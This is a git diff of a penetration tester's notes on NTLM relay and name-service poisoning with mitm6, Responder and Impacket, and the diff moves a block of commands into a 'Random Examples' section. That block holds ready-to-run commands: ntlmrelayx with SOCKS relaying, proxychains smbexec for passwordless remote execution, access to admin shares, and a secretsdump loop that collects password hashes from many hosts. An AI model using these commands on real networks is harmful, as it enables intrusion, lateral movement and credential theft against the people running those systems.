@@ -1,27 +1,19 @@
 Name Service Poisoning and Relay :::::::::::
-
+## Must be run on scanner , broadcast domain ##
 Tools:
 proxychains
 mitm6
 responder (also includes multirelay, RunFinger.py) -- landx repo
 Impacket tools (ntlmrelayx , secrets.py , smb clients , psexec client)
 
-## Must be run on scanner , broadcast domain ##
-
--------------------------------------------------------------------------------------------------
-proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass
-
-./ntlmrelayx.py -6 -tf ../../../targets.txt -l ~/tmp/ -socks -smb2support  
-
-./proxychains smbclient //172.16.177.131/c$ -U CORP/ADMIN
-
-proxychains python ./smbclient.py CORP/<domain>@10.100.4.141
-
-for i in $(cat comp.txt); do proxychains ./secretsdump.py <domain>/<user>@$i >> hashes/hashdump$i ; done
-
-root@kalibeto # proxychains ./secretsdump.py <domain>/<user>@10.100.4.174
---------------------------------------------------------------------------------------------------
-
+------------------------------------------------------------------------------
+## make sure to modify proxychains config file at /etc/proxychains.conf ##
+--This is for when ntlmrelayx.py binds the relayed sessions to sockets
+			-At the bottom of the file::
+					[ProxyList]
+					socks4 <scanner-ip> 1080
+**proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass**					
+------------------------------------------------------------------------------					
 General steps (after installation):::
 
 This will only work for hosts that have SMB signing disabled, DC's have this enabled by default so keep that in mind. To identify hosts that have smb signing disabled. To do this we use runfinger.py, included in the responder repo.
@@ -92,4 +84,18 @@ https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
 Extras::
 Use ldap:// on ntlmrelayx to dump active directory > target those users with multirelay 
 
+Random Examples::
+-------------------------------------------------------------------------------------------------
+proxychains python smbexec.py CORP/<domain>@10.100.4.174 --no-pass
+
+./ntlmrelayx.py -6 -tf ../../../targets.txt -l ~/tmp/ -socks -smb2support  
+
+./proxychains smbclient //172.16.177.131/c$ -U CORP/ADMIN
+
+proxychains python ./smbclient.py CORP/<domain>@10.100.4.141
+
+for i in $(cat comp.txt); do proxychains ./secretsdump.py <domain>/<user>@$i >> hashes/hashdump$i ; done
+
+root@kalibeto # proxychains ./secretsdump.py <domain>/<user>@10.100.4.174
+--------------------------------------------------------------------------------------------------
 
